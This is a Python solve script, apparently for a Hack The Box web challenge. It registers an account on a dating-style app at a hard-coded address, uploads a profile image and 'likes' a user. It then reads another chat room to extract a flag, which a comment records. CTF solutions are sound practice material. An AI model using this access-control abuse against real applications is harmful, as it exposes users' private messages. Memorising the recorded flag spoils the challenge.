import requests
import re

## In this challenge you should have file named "test.jpg"(jpg file) in script working directory

host, port = '94.237.55.43', 51907

url = f'http://{host}:{port}/register'

session = requests.Session()

data = {
    "username": "h4cker",
    "password": "password123",
    "email": "h4cker.com",
    "age": 88,
    "bio": "hacker",
    "user-gender": "Male",
    "interested-gender": "Male"
}

files = {
    "profile-picture": ("test.jpg", open("../test.jpg", "rb"), "image/jpeg")
}

response = session.post(url, data=data, files=files)

liked_url = f'http://{host}:{port}/like'

app_match = {
    "liked-person": (None,"Renata")
}

app_req = session.post(liked_url, files=app_match)

flag_url = f'http://{host}:{port}/chat/?rid=3'

flag_response = session.get(flag_url)

flag = re.search(r'HTB\{.*?\}', flag_response.text) ##return -> <re.Match object; span=(3793, 3826), match='HTB{d0nt_trust_str4ng3r5_bl1ndly}'>

print(flag.group())